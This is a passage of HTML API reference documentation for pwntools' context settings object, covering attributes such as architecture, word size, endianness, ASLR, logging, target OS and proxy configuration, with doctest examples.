both <a class="reference internal" href="#pwnlib.context.ContextType.endian" title="pwnlib.context.ContextType.endian"><code class="xref py py-attr docutils literal"><span class="pre">endian</span></code></a> and <a class="reference internal" href="#pwnlib.context.ContextType.bits" title="pwnlib.context.ContextType.bits"><code class="xref py py-attr docutils literal"><span class="pre">bits</span></code></a></p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;powerpc64&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">vars</span><span class="p">(</span><span class="n">context</span><span class="p">)</span> <span class="o">==</span> <span class="p">{</span><span class="s1">&#39;arch&#39;</span><span class="p">:</span> <span class="s1">&#39;powerpc64&#39;</span><span class="p">,</span> <span class="s1">&#39;bits&#39;</span><span class="p">:</span> <span class="mi">64</span><span class="p">,</span> <span class="s1">&#39;endian&#39;</span><span class="p">:</span> <span class="s1">&#39;big&#39;</span><span class="p">}</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.architectures">
<code class="descclassname">ContextType.</code><code class="descname">architectures</code><em class="property"> = OrderedDict([('powerpc64', {'bits': 64, 'endian': 'big'}), ('aarch64', {'bits': 64, 'endian': 'little'}), ('sparc64', {'bits': 64, 'endian': 'big'}), ('powerpc', {'bits': 32, 'endian': 'big'}), ('mips64', {'bits': 64, 'endian': 'little'}), ('msp430', {'bits': 16, 'endian': 'little'}), ('thumb', {'bits': 32, 'endian': 'little'}), ('amd64', {'bits': 64, 'endian': 'little'}), ('sparc', {'bits': 32, 'endian': 'big'}), ('alpha', {'bits': 64, 'endian': 'little'}), ('s390', {'bits': 32, 'endian': 'big'}), ('i386', {'bits': 32, 'endian': 'little'}), ('m68k', {'bits': 32, 'endian': 'big'}), ('mips', {'bits': 32, 'endian': 'little'}), ('ia64', {'bits': 64, 'endian': 'big'}), ('cris', {'bits': 32, 'endian': 'little'}), ('vax', {'bits': 32, 'endian': 'little'}), ('avr', {'bits': 8, 'endian': 'little'}), ('arm', {'bits': 32, 'endian': 'little'})])</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.architectures" title="Permalink to this definition">¶</a></dt>
<dd><p>Keys are valid values for <a class="reference internal" href="#pwnlib.context.ContextType.arch" title="pwnlib.context.ContextType.arch"><code class="xref py py-meth docutils literal"><span class="pre">pwnlib.context.ContextType.arch()</span></code></a>.
Values are defaults which are set when
<a class="reference internal" href="#pwnlib.context.ContextType.arch" title="pwnlib.context.ContextType.arch"><code class="xref py py-attr docutils literal"><span class="pre">pwnlib.context.ContextType.arch</span></code></a> is set</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.aslr">
<code class="descclassname">ContextType.</code><code class="descname">aslr</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.aslr" title="Permalink to this definition">¶</a></dt>
<dd><p>ASLR settings for new processes.</p>
<p>If <code class="xref py py-const docutils literal"><span class="pre">False</span></code>, attempt to disable ASLR in all processes which are
created via <code class="docutils literal"><span class="pre">personality</span></code> (<code class="docutils literal"><span class="pre">setarch</span> <span class="pre">-R</span></code>) and <code class="docutils literal"><span class="pre">setrlimit</span></code>
(<code class="docutils literal"><span class="pre">ulimit</span> <span class="pre">-s</span> <span class="pre">unlimited</span></code>).</p>
<p>The <code class="docutils literal"><span class="pre">setarch</span></code> changes are lost if a <code class="docutils literal"><span class="pre">setuid</span></code> binary is executed.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.binary">
<code class="descclassname">ContextType.</code><code class="descname">binary</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.binary" title="Permalink to this definition">¶</a></dt>
<dd><p>Infer target architecture, bit-with, and endianness from a binary file.
Data type is a <code class="xref py py-class docutils literal"><span class="pre">pwnlib.elf.ELF</span></code> object.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="p">,</span> <span class="n">context</span><span class="o">.</span><span class="n">bits</span>
<span class="go">(&#39;i386&#39;, 32)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s1">&#39;/bin/bash&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="p">,</span> <span class="n">context</span><span class="o">.</span><span class="n">bits</span>
<span class="go">(&#39;amd64&#39;, 64)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">binary</span>
<span class="go">ELF(&#39;/bin/bash&#39;)</span>
</pre></div>
</div>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.bits">
<code class="descclassname">ContextType.</code><code class="descname">bits</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.bits" title="Permalink to this definition">¶</a></dt>
<dd><p>Target machine word size, in bits (i.e. the size of general purpose registers).</p>
<p>The default value is <code class="docutils literal"><span class="pre">32</span></code>, but changes according to <a class="reference internal" href="#pwnlib.context.ContextType.arch" title="pwnlib.context.ContextType.arch"><code class="xref py py-attr docutils literal"><span class="pre">arch</span></code></a>.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">bits</span> <span class="o">==</span> <span class="mi">32</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">bits</span> <span class="o">=</span> <span class="mi">64</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">bits</span> <span class="o">==</span> <span class="mi">64</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">bits</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> 
<span class="gt">Traceback (most recent call last):</span>
<span class="c">...</span>
<span class="gr">AttributeError</span>: <span class="n">bits must be &gt; 0 (-1)</span>
</pre></div>
</div>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.buffer_size">
<code class="descclassname">ContextType.</code><code class="descname">buffer_size</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.buffer_size" title="Permalink to this definition">¶</a></dt>
<dd><p>Internal buffer size to use for <a class="reference internal" href="index.html#pwnlib.tubes.tube.tube" title="pwnlib.tubes.tube.tube"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.tubes.tube.tube</span></code></a> objects.</p>
<p>This is not the maximum size of the buffer, but this is the amount of data
which is passed to each raw <code class="docutils literal"><span class="pre">read</span></code> syscall (or equivalent).</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.bytes">
<code class="descclassname">ContextType.</code><code class="descname">bytes</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.bytes" title="Permalink to this definition">¶</a></dt>
<dd><p>Target machine word size, in bytes (i.e. the size of general purpose registers).</p>
<p>This is a convenience wrapper around <code class="docutils literal"><span class="pre">bits</span> <span class="pre">/</span> <span class="pre">8</span></code>.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">bytes</span> <span class="o">=</span> <span class="mi">1</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">bits</span> <span class="o">==</span> <span class="mi">8</span>
<span class="go">True</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">bytes</span> <span class="o">=</span> <span class="mi">0</span> 
<span class="gt">Traceback (most recent call last):</span>
<span class="c">...</span>
<span class="gr">AttributeError</span>: <span class="n">bits must be &gt; 0 (0)</span>
</pre></div>
</div>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.cache_dir">
<code class="descclassname">ContextType.</code><code class="descname">cache_dir</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.cache_dir" title="Permalink to this definition">¶</a></dt>
<dd><p>Directory used for caching data.</p>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last">May be either a path string, or <code class="xref py py-const docutils literal"><span class="pre">None</span></code>.</p>
</div>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">cache_dir</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">cache_dir</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">cache_dir</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">os</span><span class="o">.</span><span class="n">chmod</span><span class="p">(</span><span class="n">cache_dir</span><span class="p">,</span> <span class="mo">0o000</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">cache_dir</span> <span class="ow">is</span> <span class="kc">None</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">os</span><span class="o">.</span><span class="n">chmod</span><span class="p">(</span><span class="n">cache_dir</span><span class="p">,</span> <span class="mo">0o755</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">cache_dir</span> <span class="o">==</span> <span class="n">context</span><span class="o">.</span><span class="n">cache_dir</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.defaults">
<code class="descclassname">ContextType.</code><code class="descname">defaults</code><em class="property"> = {'kernel': None, 'noptrace': False, 'delete_corefiles': False, 'randomize': False, 'binary': None, 'log_level': 20, 'gdbinit': '', 'terminal': (), 'bits': 32, 'rename_corefiles': True, 'newline': '\n', 'proxy': None, 'device': None, 'buffer_size': 4096, 'arch': 'i386', 'aslr': True, 'adb_port': 5037, 'signed': False, 'adb_host': 'localhost', 'timeout': pwnlib.timeout.maximum, 'endian': 'little', 'log_file': &lt;pwnlib.context._devnull object&gt;, 'os': 'linux', 'log_console': &lt;open file '&lt;stdout&gt;', mode 'w'&gt;}</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.defaults" title="Permalink to this definition">¶</a></dt>
<dd><p>Default values for <a class="reference internal" href="#pwnlib.context.ContextType" title="pwnlib.context.ContextType"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.context.ContextType</span></code></a></p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.delete_corefiles">
<code class="descclassname">ContextType.</code><code class="descname">delete_corefiles</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.delete_corefiles" title="Permalink to this definition">¶</a></dt>
<dd><p>Whether pwntools automatically deletes corefiles after exiting.
This only affects corefiles accessed via <a class="reference internal" href="index.html#pwnlib.tubes.process.process.corefile" title="pwnlib.tubes.process.process.corefile"><code class="xref py py-attr docutils literal"><span class="pre">process.corefile</span></code></a>.</p>
<p>Default value is <code class="docutils literal"><span class="pre">False</span></code>.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.device">
<code class="descclassname">ContextType.</code><code class="descname">device</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.device" title="Permalink to this definition">¶</a></dt>
<dd><p>Sets the device being operated on.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.endian">
<code class="descclassname">ContextType.</code><code class="descname">endian</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.endian" title="Permalink to this definition">¶</a></dt>
<dd><p>Endianness of the target machine.</p>
<p>The default value is <code class="docutils literal"><span class="pre">'little'</span></code>, but changes according to <a class="reference internal" href="#pwnlib.context.ContextType.arch" title="pwnlib.context.ContextType.arch"><code class="xref py py-attr docutils literal"><span class="pre">arch</span></code></a>.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Raises:</th><td class="field-body"><code class="xref py py-exc docutils literal"><span class="pre">AttributeError</span></code> &#8211; An invalid endianness was provided</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">==</span> <span class="s1">&#39;little&#39;</span>
<span class="go">True</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s1">&#39;big&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">endian</span>
<span class="go">&#39;big&#39;</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s1">&#39;be&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">==</span> <span class="s1">&#39;big&#39;</span>
<span class="go">True</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s1">&#39;foobar&#39;</span> 
<span class="gt">Traceback (most recent call last):</span>
 <span class="c">...</span>
<span class="gr">AttributeError</span>: <span class="n">endian must be one of [&#39;be&#39;, &#39;big&#39;, &#39;eb&#39;, &#39;el&#39;, &#39;le&#39;, &#39;little&#39;]</span>
</pre></div>
</div>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.endianness">
<code class="descclassname">ContextType.</code><code class="descname">endianness</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.endianness" title="Permalink to this definition">¶</a></dt>
<dd><p>Legacy alias for <a class="reference internal" href="#pwnlib.context.ContextType.endian" title="pwnlib.context.ContextType.endian"><code class="xref py py-attr docutils literal"><span class="pre">endian</span></code></a>.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">==</span> <span class="n">context</span><span class="o">.</span><span class="n">endianness</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.endiannesses">
<code class="descclassname">ContextType.</code><code class="descname">endiannesses</code><em class="property"> = OrderedDict([('little', 'little'), ('big', 'big'), ('el', 'little'), ('le', 'little'), ('be', 'big'), ('eb', 'big')])</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.endiannesses" title="Permalink to this definition">¶</a></dt>
<dd><p>Valid values for <a class="reference internal" href="#pwnlib.context.ContextType.endian" title="pwnlib.context.ContextType.endian"><code class="xref py py-attr docutils literal"><span class="pre">endian</span></code></a></p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.gdbinit">
<code class="descclassname">ContextType.</code><code class="descname">gdbinit</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.gdbinit" title="Permalink to this definition">¶</a></dt>
<dd><p>Path to the gdbinit that is used when running GDB locally.</p>
<p>This is useful if you want pwntools-launched GDB to include some additional modules,
like PEDA but you do not want to have GDB include them by default.</p>
<p>The setting will only apply when GDB is launched locally since remote hosts may not have
the necessary requirements for the gdbinit.</p>
<p>If set to an empty string, GDB will use the default <cite>~/.gdbinit</cite>.</p>
<p>Default value is <code class="docutils literal"><span class="pre">&quot;&quot;</span></code>.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.kernel">
<code class="descclassname">ContextType.</code><code class="descname">kernel</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.kernel" title="Permalink to this definition">¶</a></dt>
<dd><p>Target machine&#8217;s kernel architecture.</p>
<p>Usually, this is the same as <code class="docutils literal"><span class="pre">arch</span></code>, except when
running a 32-bit binary on a 64-bit kernel (e.g. i386-on-amd64).</p>
<p>Even then, this doesn&#8217;t matter much &#8211; only when the the segment
registers need to be known</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.log_console">
<code class="descclassname">ContextType.</code><code class="descname">log_console</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.log_console" title="Permalink to this definition">¶</a></dt>
<dd><p>Sets the default logging console target.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;warn&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">log</span><span class="o">.</span><span class="n">warn</span><span class="p">(</span><span class="s2">&quot;Hello&quot;</span><span class="p">)</span>
<span class="go">[!] Hello</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">log_console</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/dev/null&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">log</span><span class="o">.</span><span class="n">warn</span><span class="p">(</span><span class="s2">&quot;Hello&quot;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
</pre></div>
</div>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.log_file">
<code class="descclassname">ContextType.</code><code class="descname">log_file</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.log_file" title="Permalink to this definition">¶</a></dt>
<dd><p>Sets the target file for all logging output.</p>
<p>Works in a similar fashion to <a class="reference internal" href="#pwnlib.context.ContextType.log_level" title="pwnlib.context.ContextType.log_level"><code class="xref py py-attr docutils literal"><span class="pre">log_level</span></code></a>.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">log_file</span> <span class="o">=</span> <span class="s1">&#39;foo.txt&#39;</span> 
<span class="gp">&gt;&gt;&gt; </span><span class="n">log</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s1">&#39;Hello!&#39;</span><span class="p">)</span> 
<span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;ERROR&#39;</span><span class="p">):</span> 
<span class="gp">... </span>    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;Hello again!&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">(</span><span class="n">log_file</span><span class="o">=</span><span class="s1">&#39;bar.txt&#39;</span><span class="p">):</span>
<span class="gp">... </span>    <span class="n">log</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s1">&#39;Hello from bar!&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;Hello from foo!&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">file</span><span class="p">(</span><span class="s1">&#39;foo.txt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()[</span><span class="o">-</span><span class="mi">3</span><span class="p">]</span> 
<span class="go">&#39;...:DEBUG:...:Hello!\n&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">file</span><span class="p">(</span><span class="s1">&#39;foo.txt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()[</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span> 
<span class="go">&#39;...:INFO:...:Hello again!\n&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">file</span><span class="p">(</span><span class="s1">&#39;foo.txt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> 
<span class="go">&#39;...:INFO:...:Hello from foo!\n&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">file</span><span class="p">(</span><span class="s1">&#39;bar.txt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> 
<span class="go">&#39;...:DEBUG:...:Hello from bar!\n&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.log_level">
<code class="descclassname">ContextType.</code><code class="descname">log_level</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.log_level" title="Permalink to this definition">¶</a></dt>
<dd><p>Sets the verbosity of <code class="docutils literal"><span class="pre">pwntools</span></code> logging mechanism.</p>
<p>More specifically it controls the filtering of messages that happens
inside the handler for logging to the screen. So if you want e.g. log
all messages to a file, then this attribute makes no difference to you.</p>
<p>Valid values are specified by the standard Python <code class="docutils literal"><span class="pre">logging</span></code> module.</p>
<p>Default value is set to <code class="docutils literal"><span class="pre">INFO</span></code>.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;error&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">==</span> <span class="n">logging</span><span class="o">.</span><span class="n">ERROR</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="mi">10</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;foobar&#39;</span> 
<span class="gt">Traceback (most recent call last):</span>
<span class="c">...</span>
<span class="gr">AttributeError</span>: <span class="n">log_level must be an integer or one of [&#39;CRITICAL&#39;, &#39;DEBUG&#39;, &#39;ERROR&#39;, &#39;INFO&#39;, &#39;NOTSET&#39;, &#39;WARN&#39;, &#39;WARNING&#39;]</span>
</pre></div>
</div>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.noptrace">
<code class="descclassname">ContextType.</code><code class="descname">noptrace</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.noptrace" title="Permalink to this definition">¶</a></dt>
<dd><p>Disable all actions which rely on ptrace.</p>
<p>This is useful for switching between local exploitation with a debugger,
and remote exploitation (without a debugger).</p>
<p>This option can be set with the <code class="docutils literal"><span class="pre">NOPTRACE</span></code> command-line argument.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.os">
<code class="descclassname">ContextType.</code><code class="descname">os</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.os" title="Permalink to this definition">¶</a></dt>
<dd><p>Operating system of the target machine.</p>
<p>The default value is <code class="docutils literal"><span class="pre">linux</span></code>.</p>
<p>Allowed values are listed in <a class="reference internal" href="#pwnlib.context.ContextType.oses" title="pwnlib.context.ContextType.oses"><code class="xref py py-attr docutils literal"><span class="pre">pwnlib.context.ContextType.oses</span></code></a>.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;foobar&#39;</span> 
<span class="gt">Traceback (most recent call last):</span>
<span class="c">...</span>
<span class="gr">AttributeError</span>: <span class="n">os must be one of [&#39;android&#39;, &#39;cgc&#39;, &#39;freebsd&#39;, &#39;linux&#39;, &#39;windows&#39;]</span>
</pre></div>
</div>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.oses">
<code class="descclassname">ContextType.</code><code class="descname">oses</code><em class="property"> = ['android', 'cgc', 'freebsd', 'linux', 'windows']</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.oses" title="Permalink to this definition">¶</a></dt>
<dd><p>Valid values for <a class="reference internal" href="#pwnlib.context.ContextType.os" title="pwnlib.context.ContextType.os"><code class="xref py py-meth docutils literal"><span class="pre">pwnlib.context.ContextType.os()</span></code></a></p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.proxy">
<code class="descclassname">ContextType.</code><code class="descname">proxy</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.proxy" title="Permalink to this definition">¶</a></dt>
<dd><p>Default proxy for all socket connections.</p>
<p>Accepts either a string (hostname or IP address) for a SOCKS5 proxy on
the default port, <strong>or</strong> a <code class="docutils literal"><span class="pre">tuple</span></code> passed to <code class="docutils literal"><span class="pre">socks.set_default_proxy</span></code>,
e.g. <code class="docutils literal"><span class="pre">(socks.SOCKS4,</span> <span class="pre">'localhost',</span> <span class="pre">1234)</span></code>.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">proxy</span> <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span> 
<span class="gp">&gt;&gt;&gt; </span><span class="n">r</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;google.com&#39;</span><span class="p">,</span> <span class="mi">80</span><span class="p">)</span>
<span class="gt">Traceback (most recent call last):</span>
<span class="c">...</span>
<span class="gr">ProxyConnectionError</span>: <span class="n">Error connecting to SOCKS5 proxy localhost:1080: [Errno 111] Connection refused</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">proxy</span> <span class="o">=</span> <span class="kc">None</span>
